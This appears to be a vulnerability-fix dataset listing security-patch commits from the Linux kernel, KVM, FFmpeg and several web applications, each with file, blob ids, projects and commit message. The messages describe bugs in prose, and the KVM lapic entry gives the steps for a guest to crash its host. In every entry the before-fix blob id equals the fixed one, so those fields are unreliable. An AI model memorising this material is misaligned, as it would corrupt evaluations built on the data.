ARM: 7809/1: perf: fix event validation for software group leaders\n\nIt is possible to construct an event group with a software event as a group leader and then subsequently add a hardware event to the group. This results in the event group being validated by adding all members of the group to a fake PMU and attempting to allocate each event on their respective PMU.\n\nUnfortunately, for software events wthout a corresponding arm_pmu, this results in a kernel crash attempting to dereference the ->get_event_idx function pointer.\n\nThis patch fixes the problem by checking explicitly for software events and ignoring those in event validation (since they can always be scheduled). We will probably want to revisit this for 3.12, since the validation checks don't appear to work correctly when dealing with multiple hardware PMUs anyway.\n\nCc: <stable@vger.kernel.org> Reported-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>

======================================================================
Commit With Fix: 
    2960576378d17d71cc8dccc926352ce568b5eec1
File(s) In Commit: 
    libavcodec/g2meet.c
Blob(s) In Commit: 
    99d4d1ec37b266dce2bf68bc0a4169e346885d4d
Blob(s) Before Fix: 
    99d4d1ec37b266dce2bf68bc0a4169e346885d4d
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2960576378d17d71cc8dccc926352ce568b5eec1:
avcodec/g2meet: fix src pointer checks in kempf_decode_tile()\n\nFixes Ticket2842\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    c94f9e854228e0ea00e1de8769d8d3f7cab84a55
File(s) In Commit: 
    libavutil/mem.c
Blob(s) In Commit: 
    20dfd629a84110c37b0aba81533764867795222c
Blob(s) Before Fix: 
    20dfd629a84110c37b0aba81533764867795222c
Projects:
    00ERNEST00_FFmpeg
Commit Message for c94f9e854228e0ea00e1de8769d8d3f7cab84a55:
avutil/mem: Fix flipped condition\n\nFixes return code and later null pointer dereference\n\nFound-by: Laurent Butti <laurentb@gmail.com> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    2433c8f094a008895e66f25bd1773cdb01c91d01
File(s) In Commit: 
    net/sysctl_net.c
Blob(s) In Commit: 
    e7000be321b0148469264524ed6fce75c3952955
Blob(s) Before Fix: 
    e7000be321b0148469264524ed6fce75c3952955
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2433c8f094a008895e66f25bd1773cdb01c91d01:
net: Update the sysctl permissions handler to test effective uid/gid\n\nModify the code to use current_euid(), and in_egroup_p, as in done in fs/proc/proc_sysctl.c:test_perm()\n\nCc: stable@vger.kernel.org Reviewed-by: Eric Sandeen <sandeen@redhat.com> Reported-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e9c6a182649f4259db704ae15a91ac820e63b0ca
File(s) In Commit: 
    drivers/md/dm-snap-persistent.c
Blob(s) In Commit: 
    2d2b1b7588d7e476b7fc814a63c82bad2edb1ed6
Blob(s) Before Fix: 
    2d2b1b7588d7e476b7fc814a63c82bad2edb1ed6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for e9c6a182649f4259db704ae15a91ac820e63b0ca:
dm snapshot: fix data corruption\n\nThis patch fixes a particular type of data corruption that has been encountered when loading a snapshot's metadata from disk.\n\nWhen we allocate a new chunk in persistent_prepare, we increment ps->next_free and we make sure that it doesn't point to a metadata area by further incrementing it if necessary.\n\nWhen we load metadata from disk on device activation, ps->next_free is positioned after the last used data chunk. However, if this last used data chunk is followed by a metadata area, ps->next_free is positioned erroneously to the metadata area. A newly-allocated chunk is placed at the same location as the metadata area, resulting in data or metadata corruption.\n\nThis patch changes the code so that ps->next_free skips the metadata area when metadata are loaded in function read_exceptions.\n\nThe patch also moves a piece of code from persistent_prepare_exception to a separate function skip_metadata to avoid code duplication.\n\nCVE-2013-4299\n\nSigned-off-by: Mikulas Patocka <mpatocka@redhat.com> Cc: stable@vger.kernel.org Cc: Mike Snitzer <snitzer@redhat.com> Signed-off-by: Alasdair G Kergon <agk@redhat.com>

======================================================================
Commit With Fix: 
    d661684cf6820331feae71146c35da83d794467e
File(s) In Commit: 
    net/core/scm.c
Blob(s) In Commit: 
    b4da80b1cc07d28eafec50a6185d6d2a2ece61af
Blob(s) Before Fix: 
    b4da80b1cc07d28eafec50a6185d6d2a2ece61af
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d661684cf6820331feae71146c35da83d794467e:
net: Check the correct namespace when spoofing pid over SCM_RIGHTS\n\nThis is a security bug.\n\nThe follow-up will fix nsproxy to discourage this type of issue from happening again.\n\nCc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Reviewed-by: "Eric W. Biederman" <ebiederm@xmission.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    95ee62083cb6453e056562d91f597552021e6ae7
File(s) In Commit: 
    net/sctp/ipv6.c
Blob(s) In Commit: 
    4f52e2ce263d0852bf01cc286560f8d13fbe208a
Blob(s) Before Fix: 
    4f52e2ce263d0852bf01cc286560f8d13fbe208a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 95ee62083cb6453e056562d91f597552021e6ae7:
net: sctp: fix ipv6 ipsec encryption bug in sctp_v6_xmit\n\nAlan Chester reported an issue with IPv6 on SCTP that IPsec traffic is not being encrypted, whereas on IPv4 it is. Setting up an AH + ESP transport does not seem to have the desired effect:\n\nSCTP + IPv4:\n\n  22:14:20.809645 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 116)     192.168.0.2 > 192.168.0.5: AH(spi=0x00000042,sumlen=16,seq=0x1): ESP(spi=0x00000044,seq=0x1), length 72   22:14:20.813270 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 340)     192.168.0.5 > 192.168.0.2: AH(spi=0x00000043,sumlen=16,seq=0x1):\n\nSCTP + IPv6:\n\n  22:31:19.215029 IP6 (class 0x02, hlim 64, next-header SCTP (132) payload length: 364)     fe80::222:15ff:fe87:7fc.3333 > fe80::92e6:baff:fe0d:5a54.36767: sctp     1) [INIT ACK] [init tag: 747759530] [rwnd: 62464] [OS: 10] [MIS: 10]\n\nMoreover, Alan says:\n\n  This problem was seen with both Racoon and Racoon2. Other people have seen   this with OpenSwan. When IPsec is configured to encrypt all upper layer   protocols the SCTP connection does not initialize. After using Wireshark to   follow packets, this is because the SCTP packet leaves Box A unencrypted and   Box B believes all upper layer protocols are to be encrypted so it drops   this packet, causing the SCTP connection to fail to initialize. When IPsec   is configured to encrypt just SCTP, the SCTP packets are observed unencrypted.\n\nIn fact, using `socat sctp6-listen:3333 -` on one end and transferring "plaintext" string on the other end, results in cleartext on the wire where SCTP eventually does not report any errors, thus in the latter case that Alan reports, the non-paranoid user might think he's communicating over an encrypted transport on SCTP although he's not (tcpdump ... -X):\n\n  ...   0x0030: 5d70 8e1a 0003 001a 177d eb6c 0000 0000  ]p.......}.l....   0x0040: 0000 0000 706c 6169 6e74 6578 740a 0000  ....plaintext...\n\nOnly in /proc/net/xfrm_stat we can see XfrmInTmplMismatch increasing on the receiver side. Initial follow-up analysis from Alan's bug report was done by Alexey Dobriyan. Also thanks to Vlad Yasevich for feedback on this.\n\nSCTP has its own implementation of sctp_v6_xmit() not calling inet6_csk_xmit(). This has the implication that it probably never really got updated along with changes in inet6_csk_xmit() and therefore does not seem to invoke xfrm handlers.\n\nSCTP's IPv4 xmit however, properly calls ip_queue_xmit() to do the work. Since a call to inet6_csk_xmit() would solve this problem, but result in unecessary route lookups, let us just use the cached flowi6 instead that we got through sctp_v6_get_dst(). Since all SCTP packets are being sent through sctp_packet_transmit(), we do the route lookup / flow caching in sctp_transport_route(), hold it in tp->dst and skb_dst_set() right after that. If we would alter fl6->daddr in sctp_v6_xmit() to np->opt->srcrt, we possibly could run into the same effect of not having xfrm layer pick it up, hence, use fl6_update_dst() in sctp_v6_get_dst() instead to get the correct source routed dst entry, which we assign to the skb.\n\nAlso source address routing example from 625034113 ("sctp: fix sctp to work with ipv6 source address routing") still works with this patch! Nevertheless, in RFC5095 it is actually 'recommended' to not use that anyway due to traffic amplification [1]. So it seems we're not supposed to do that anyway in sctp_v6_xmit(). Moreover, if we overwrite the flow destination here, the lower IPv6 layer will be unable to put the correct destination address into IP header, as routing header is added in ipv6_push_nfrag_opts() but then probably with wrong final destination. Things aside, result of this patch is that we do not have any XfrmInTmplMismatch increase plus on the wire with this patch it now looks like:\n\nSCTP + IPv6:\n\n  08:17:47.074080 IP6 2620:52:0:102f:7a2b:cbff:fe27:1b0a > 2620:52:0:102f:213:72ff:fe32:7eba:     AH(spi=0x00005fb4,seq=0x1): ESP(spi=0x00005fb5,seq=0x1), length 72   08:17:47.074264 IP6 2620:52:0:102f:213:72ff:fe32:7eba > 2620:52:0:102f:7a2b:cbff:fe27:1b0a:     AH(spi=0x00003d54,seq=0x1): ESP(spi=0x00003d55,seq=0x1), length 296\n\nThis fixes Kernel Bugzilla 24412. This security issue seems to be present since 2.6.18 kernels. Lets just hope some big passive adversary in the wild didn't have its fun with that. lksctp-tools IPv6 regression test suite passes as well with this patch.\n\n [1] http://www.secdev.org/conf/IPv6_RH_security-csw07.pdf\n\nReported-by: Alan Chester <alan.chester@tekelec.com> Reported-by: Alexey Dobriyan <adobriyan@gmail.com> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Steffen Klassert <steffen.klassert@secunet.com> Cc: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2811ebac2521ceac84f2bdae402455baa6a7fb47
File(s) In Commit: 
    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    a54c45ce4a48f0d3a65f6c54ac77bb73a6a41280
Blob(s) Before Fix: 
    a54c45ce4a48f0d3a65f6c54ac77bb73a6a41280
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2811ebac2521ceac84f2bdae402455baa6a7fb47:
ipv6: udp packets following an UFO enqueued packet need also be handled by UFO\n\nIn the following scenario the socket is corked: If the first UDP packet is larger then the mtu we try to append it to the write queue via ip6_ufo_append_data. A following packet, which is smaller than the mtu would be appended to the already queued up gso-skb via plain ip6_append_data. This causes random memory corruptions.\n\nIn ip6_ufo_append_data we also have to be careful to not queue up the same skb multiple times. So setup the gso frame only when no first skb is available.\n\nThis also fixes a shortcoming where we add the current packet's length to cork->length but return early because of a packet > mtu with dontfrag set (instead of sutracting it again).\n\nFound with trinity.\n\nCc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3dad4f8e3214d6ab5f71823019a624fa48b055a3
File(s) In Commit: 
    src/lib/Gitolite/Rc.pm
Blob(s) In Commit: 
    75ff21af8aa22ea56bcf4ded5427ad42264ec35d
Blob(s) Before Fix: 
    75ff21af8aa22ea56bcf4ded5427ad42264ec35d
Projects:
    1060460048_gitolite
Commit Message for 3dad4f8e3214d6ab5f71823019a624fa48b055a3:
oops  fa06a34 had a nasty bug for fresh installs\n\nthanks to Nathan Ferch for catching this.  See thread with subject line "World writable files and directories" on the mailing list.

======================================================================
Commit With Fix: 
    0002d106a6cd35cb0a6fe03246531a4e3f32c9d0
File(s) In Commit: 
    account_sponsor_page.php
Blob(s) In Commit: 
    67c12d328fac43552cbc7155e77f33d09000ff1a
Blob(s) Before Fix: 
    67c12d328fac43552cbc7155e77f33d09000ff1a
Projects:
    01-Scripts_mantisbt
Commit Message for 0002d106a6cd35cb0a6fe03246531a4e3f32c9d0:
Fix #16513: XSS in account_sponsor_page.php project names\n\naccount_sponsor_page.php.php does not correctly sanitise project names. It is thus possible for a malicious user with project manager access permissions (or higher) to let users execute malicious JavaScript when visiting account_sponsor_page.php.

======================================================================
Commit With Fix: 
    ca0302e0c716682d2de22e9136400c704cc93e42
File(s) In Commit: 
    lib/sup/message_chunks.rb
Blob(s) In Commit: 
    8cacfc4abf348ce7634ee70d4367013d9b5550c6
Blob(s) Before Fix: 
    8cacfc4abf348ce7634ee70d4367013d9b5550c6
Projects:
    0xACE_sup
Commit Message for ca0302e0c716682d2de22e9136400c704cc93e42:
security: prevent remote command injection in content_type

======================================================================
Commit With Fix: 
    6aae0a9f145f536515e268dd6b25aa740a5edfe7
File(s) In Commit: 
    engine/engine.py
Blob(s) In Commit: 
    be66738c0b22b9dcbf50e81123629d20a87036de
Blob(s) Before Fix: 
    be66738c0b22b9dcbf50e81123629d20a87036de
Projects:
    Abioy_ibus
Commit Message for 6aae0a9f145f536515e268dd6b25aa740a5edfe7:
Added to check the input purpose for gnome-shell password dialog.

======================================================================
Commit With Fix: 
    201f99f170df14ba52ea4c52847779042b7a623b
File(s) In Commit: 
    arch/um/kernel/exitcode.c
Blob(s) In Commit: 
    41ebbfebb3332f2bc7269a754ff96b377e17212b
Blob(s) Before Fix: 
    41ebbfebb3332f2bc7269a754ff96b377e17212b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 201f99f170df14ba52ea4c52847779042b7a623b:
uml: check length in exitcode_proc_write()\n\nWe don't cap the size of buffer from the user so we could write past the end of the array here.  Only root can write to this file.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c2c65cd2e14ada6de44cb527e7f1990bede24e15
File(s) In Commit: 
    drivers/staging/ozwpan/ozcdev.c
Blob(s) In Commit: 
    6ce0af9977d8c0ccc053e98eb818a98ec8d990f7
Blob(s) Before Fix: 
    6ce0af9977d8c0ccc053e98eb818a98ec8d990f7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c2c65cd2e14ada6de44cb527e7f1990bede24e15:
staging: ozwpan: prevent overflow in oz_cdev_write()\n\nWe need to check "count" so we don't overflow the ei->data buffer.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    b5e2f339865fb443107e5b10603e53bbc92dc054
File(s) In Commit: 
    drivers/staging/wlags49_h2/wl_priv.c
Blob(s) In Commit: 
    7e10dcdc3090085460918be8dfa9261df14eaa13
Blob(s) Before Fix: 
    7e10dcdc3090085460918be8dfa9261df14eaa13
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b5e2f339865fb443107e5b10603e53bbc92dc054:
staging: wlags49_h2: buffer overflow setting station name\n\nWe need to check the length parameter before doing the memcpy().  I've actually changed it to strlcpy() as well so that it's NUL terminated.\n\nYou need CAP_NET_ADMIN to trigger these so it's not the end of the world.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    8d1e72250c847fa96498ec029891de4dc638a5ba
File(s) In Commit: 
    drivers/staging/bcm/Bcmchar.c
Blob(s) In Commit: 
    639ba96adb36b58e1c21b6ae037f084be512cdfc
Blob(s) Before Fix: 
    639ba96adb36b58e1c21b6ae037f084be512cdfc
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8d1e72250c847fa96498ec029891de4dc638a5ba:
Staging: bcm: info leak in ioctl\n\nThe DevInfo.u32Reserved[] array isn't initialized so it leaks kernel information to user space.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    a8b33654b1e3b0c74d4a1fed041c9aae50b3c427
File(s) In Commit: 
    drivers/staging/sb105x/sb_pci_mp.c
Blob(s) In Commit: 
    a10cdb17038bf9717bbb20f979fb104dda9ccb27
Blob(s) Before Fix: 
    a10cdb17038bf9717bbb20f979fb104dda9ccb27
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a8b33654b1e3b0c74d4a1fed041c9aae50b3c427:
Staging: sb105x: info leak in mp_get_count()\n\nThe icount.reserved[] array isn't initialized so it leaks stack information to userspace.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    0e033e04c2678dbbe74a46b23fffb7bb918c288e
File(s) In Commit: 
    net/ipv6/udp_offload.c
Blob(s) In Commit: 
    e7359f9eaa8d4dd14b706afc9c7241c85e52d056
Blob(s) Before Fix: 
    e7359f9eaa8d4dd14b706afc9c7241c85e52d056
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0e033e04c2678dbbe74a46b23fffb7bb918c288e:
ipv6: fix headroom calculation in udp6_ufo_fragment\n\nCommit 1e2bd517c108816220f262d7954b697af03b5f9c ("udp6: Fix udp fragmentation for tunnel traffic.") changed the calculation if there is enough space to include a fragment header in the skb from a skb->mac_header dervived one to skb_headroom. Because we already peeled off the skb to transport_header this is wrong. Change this back to check if we have enough room before the mac_header.\n\nThis fixes a panic Saran Neti reported. He used the tbf scheduler which skb_gso_segments the skb. The offsets get negative and we panic in memcpy because the skb was erroneously not expanded at the head.\n\nReported-by: Saran Neti <Saran.Neti@telus.com> Cc: Pravin B Shelar <pshelar@nicira.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    338c7dbadd2671189cec7faf64c84d01071b3f96
File(s) In Commit: 
    virt/kvm/kvm_main.c
Blob(s) In Commit: 
    4f588bc941861b10f7d5dccf9305941c8d3cc218
Blob(s) Before Fix: 
    4f588bc941861b10f7d5dccf9305941c8d3cc218
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 338c7dbadd2671189cec7faf64c84d01071b3f96:
KVM: Improve create VCPU parameter (CVE-2013-4587)\n\nIn multiple functions the vcpu_id is used as an offset into a bitfield.  Ag malicious user could specify a vcpu_id greater than 255 in order to set or clear bits in kernel memory.  This could be used to elevate priveges in the kernel.  This patch verifies that the vcpu_id provided is less than 255. The api documentation already specifies that the vcpu_id must be less than max_vcpus, but this is currently not checked.\n\nReported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    04bcef2a83f40c6db24222b27a52892cba39dffb
File(s) In Commit: 
    net/netfilter/ipvs/ip_vs_ctl.c
Blob(s) In Commit: 
    c37ac2d7bec44da042af844717084489aae511a6
Blob(s) Before Fix: 
    c37ac2d7bec44da042af844717084489aae511a6
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 04bcef2a83f40c6db24222b27a52892cba39dffb:
ipvs: Add boundary check on ioctl arguments\n\nThe ipvs code has a nifty system for doing the size of ioctl command copies  it defines an array with values into which it indexes the cmd to find the right length.\n\nUnfortunately, the ipvs code forgot to check if the cmd was in the range that the array provides, allowing for an index outside of the array, which then gives a "garbage" result into the length, which then gets used for copying into a stack buffer.\n\nFix this by adding sanity checks on these as well as the copy size.\n\n[ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ] Signed-off-by: Arjan van de Ven <arjan@linux.intel.com> Acked-by: Julian Anastasov <ja@ssi.bg> Signed-off-by: Simon Horman <horms@verge.net.au> Signed-off-by: Patrick McHardy <kaber@trash.net>

======================================================================
Commit With Fix: 
    7d3e91a89b7adbc2831334def9e494dd9892f9af
File(s) In Commit: 
    fs/nfs/nfs4proc.c
Blob(s) In Commit: 
    05e5f6f9f2b80b22fa306d33fcdd06c6540725f3
Blob(s) Before Fix: 
    05e5f6f9f2b80b22fa306d33fcdd06c6540725f3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7d3e91a89b7adbc2831334def9e494dd9892f9af:
NFSv4: Check for buffer length in __nfs4_get_acl_uncached\n\nCommit 1f1ea6c "NFSv4: Fix buffer overflow checking in __nfs4_get_acl_uncached" accidently dropped the checking for too small result buffer length.\n\nIf someone uses getxattr on "system.nfs4_acl" on an NFSv4 mount supporting ACLs, the ACL has not been cached and the buffer suplied is too short, we still copy the complete ACL, resulting in kernel and user space memory corruption.\n\nSigned-off-by: Sven Wegener <sven.wegener@stealer.net> Cc: stable@kernel.org Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>

======================================================================
Commit With Fix: 
    625c16bb28bb120d262b3f19f89c2c06cb9b0da9
File(s) In Commit: 
    Auth/Yadis/XML.php
Blob(s) In Commit: 
    bb13775618cca7957c77c19b7ac2d2512c46b874
Blob(s) Before Fix: 
    bb13775618cca7957c77c19b7ac2d2512c46b874
Projects:
    38pages_php-openid
Commit Message for 625c16bb28bb120d262b3f19f89c2c06cb9b0da9:
disable external XML entities and libxml errors\n\nthanks to Kousuke Ebihara for the report and patch.

======================================================================
Commit With Fix: 
    45eec046391afabb676b62b9201da0cd530360b4
File(s) In Commit: 
    modules/rss/rss.php
Blob(s) In Commit: 
    f18dfc19dbe34d94fddb8c2c739e6785baa77f25
Blob(s) Before Fix: 
    f18dfc19dbe34d94fddb8c2c739e6785baa77f25
Projects:
    1nv4d3r5_Cotonti
Commit Message for 45eec046391afabb676b62b9201da0cd530360b4:
Fixed SQL injection vulnerability in RSS module

======================================================================
Commit With Fix: 
    c5f27bf66a7f35bd3daeb5f693f3e2493f51b1f3
File(s) In Commit: 
    core/inc/bigtree/cms.php
Blob(s) In Commit: 
    66d34d7bd27c2e56644e291d48f68fb31bf1e4e8
Blob(s) Before Fix: 
    66d34d7bd27c2e56644e291d48f68fb31bf1e4e8
Projects:
    4v4t4r_BigTree-CMS
Commit Message for c5f27bf66a7f35bd3daeb5f693f3e2493f51b1f3:
Fixed error when putting ' in a URL by accident.

======================================================================
Commit With Fix: 
    8a59c2e13f8e151b6a9e98f73e641e1ec8d928df
File(s) In Commit: 
    core/admin/modules/developer/modules/views/add.php
Blob(s) In Commit: 
    a3dc82539b15162e111c07a1394f0fd80dce2b13
Blob(s) Before Fix: 
    a3dc82539b15162e111c07a1394f0fd80dce2b13
Projects:
    4v4t4r_BigTree-CMS
Commit Message for 8a59c2e13f8e151b6a9e98f73e641e1ec8d928df:
Fixed a potential cross-site scripting issue on the module view add page. Thanks to High-Tech Bridge Security Research Lab for finding this and the Cross-Site Request Forgery issues.

======================================================================
Commit With Fix: 
    e8180dcaa8470ceca21109f143876fdcd9fe050a
File(s) In Commit: 
    arch/arm/kvm/arm.c
Blob(s) In Commit: 
    ef1703b9587b0264c5b7ea8ebb246376dfe76326
Blob(s) Before Fix: 
    ef1703b9587b0264c5b7ea8ebb246376dfe76326
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for e8180dcaa8470ceca21109f143876fdcd9fe050a:
ARM: KVM: prevent NULL pointer dereferences with KVM VCPU ioctl\n\nSome ARM KVM VCPU ioctls require the vCPU to be properly initialized with the KVM_ARM_VCPU_INIT ioctl before being used with further requests. KVM_RUN checks whether this initialization has been done, but other ioctls do not. Namely KVM_GET_REG_LIST will dereference an array with index -1 without initialization and thus leads to a kernel oops. Fix this by adding checks before executing the ioctl handlers.\n\n [ Removed superflous comment from static function - Christoffer ]\n\nChanges from v1:  * moved check into a static function with a meaningful name\n\nSigned-off-by: Andre Przywara <andre.przywara@linaro.org> Signed-off-by: Christoffer Dall <cdall@cs.columbia.edu>

======================================================================
Commit With Fix: 
    f8d441cd25172fdfe5b613442fedfc0da3cc333d
File(s) In Commit: 
    apache2/modsecurity.c
Blob(s) In Commit: 
    b36775d223bafbfa8859e81effd5e39d02339b20
Blob(s) Before Fix: 
    b36775d223bafbfa8859e81effd5e39d02339b20
Projects:
    0xbin_ModSecurity
Commit Message for f8d441cd25172fdfe5b613442fedfc0da3cc333d:
Fix Chunked string case sensitive issue - CVE-2013-5705

======================================================================
Commit With Fix: 
    284d7402718d98fcf10cee565415939882abab99
File(s) In Commit: 
    master/lib/Munin/Master/HTMLConfig.pm
Blob(s) In Commit: 
    1b013d4d6096e3a8a704f0dc0cd0fa6868d12e10
Blob(s) Before Fix: 
    1b013d4d6096e3a8a704f0dc0cd0fa6868d12e10
Projects:
    AMDmi3_munin
Commit Message for 284d7402718d98fcf10cee565415939882abab99:
master: avoid an endless loop in HTML generation\n\nSafeguard to avoid any bigger loop than 100 nested levels. It protects against application bugs in the parsing code.\n\nThx Christoph Biedl (debian.axhn@manchmal.in-ulm.de) for noticing and for providing a patch\n\nCloses: C:CVE-2013-6048

======================================================================
Commit With Fix: 
    b963a22e6d1a266a67e9eecc88134713fd54775c
File(s) In Commit: 
    arch/x86/kvm/lapic.c
Blob(s) In Commit: 
    89b52ec7d09c5b78bfd3d45759af11637ef43be3
Blob(s) Before Fix: 
    89b52ec7d09c5b78bfd3d45759af11637ef43be3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b963a22e6d1a266a67e9eecc88134713fd54775c:
KVM: x86: Fix potential divide by 0 in lapic (CVE-2013-6367)\n\nUnder guest controllable circumstances apic_get_tmcct will execute a divide by zero and cause a crash.  If the guest cpuid support tsc deadline timers and performs the following sequence of requests the host will crash. - Set the mode to periodic - Set the TMICT to 0 - Set the mode bits to 11 (neither periodic, nor one shot, nor tsc deadline) - Set the TMICT to non-zero. Then the lapic_timer.period will be 0, but the TMICT will not be.  If the guest then reads from the TMCCT then the host will perform a divide by 0.\n\nThis patch ensures that if the lapic_timer.period is 0, then the division does not occur.\n\nReported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    7d4562d6f7e40de04bbe29577b51c79f07d05ba6
File(s) In Commit: 
    src/main/java/hudson/scm/SubversionSCM.java
Blob(s) In Commit: 
    b591a8de442e0a6738abf94819947c5d13711be7
Blob(s) Before Fix: 
    b591a8de442e0a6738abf94819947c5d13711be7
Projects:
    2improveIT_subversion-plugin
Commit Message for 7d4562d6f7e40de04bbe29577b51c79f07d05ba6:
[FIXED SECURITY-58]\n\nencryption of passphrases wasn't sufficiently secure.

======================================================================
Commit With Fix: 
    17d68b763f09a9ce824ae23eb62c9efc57b69271
File(s) In Commit: 
    arch/x86/kvm/lapic.c
Blob(s) In Commit: 
    dec48bfaddb8ff79ee7f7734cebfca7f36844461
Blob(s) Before Fix: 
    dec48bfaddb8ff79ee7f7734cebfca7f36844461
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 17d68b763f09a9ce824ae23eb62c9efc57b69271:
KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash. When the guest writes to the ICR to request an IPI, while in x2apic mode the following things happen, the destination is read from ICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the cluster id.  A BUG_ON is triggered, which is a protection against accessing map->logical_map with an out-of-bounds access and manages to avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem is that KVM supports only one cluster with ID 0 in clustered mode, but the code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com> Cc: stable@vger.kernel.org Signed-off-by: Gleb Natapov <gleb@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    a497e47d4aec37aaf8f13509f3ef3d1f6a717d88
File(s) In Commit: 
    drivers/net/wireless/libertas/debugfs.c
Blob(s) In Commit: 
    cc6a0a586f0b748c054c4c0e8631ea0d706501cb
Blob(s) Before Fix: 
    cc6a0a586f0b748c054c4c0e8631ea0d706501cb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a497e47d4aec37aaf8f13509f3ef3d1f6a717d88:
libertas: potential oops in debugfs\n\nIf we do a zero size allocation then it will oops.  Also we can't be sure the user passes us a NUL terminated string so I've added a terminator.\n\nThis code can only be triggered by root.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Acked-by: Dan Williams <dcbw@redhat.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    b4789b8e6be3151a955ade74872822f30e8cd914
File(s) In Commit: 
    drivers/scsi/aacraid/commctrl.c
Blob(s) In Commit: 
    fbcd48d0bfc3397f2a5b202b093d06bbaa2420a6
Blob(s) Before Fix: 
    fbcd48d0bfc3397f2a5b202b093d06bbaa2420a6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b4789b8e6be3151a955ade74872822f30e8cd914:
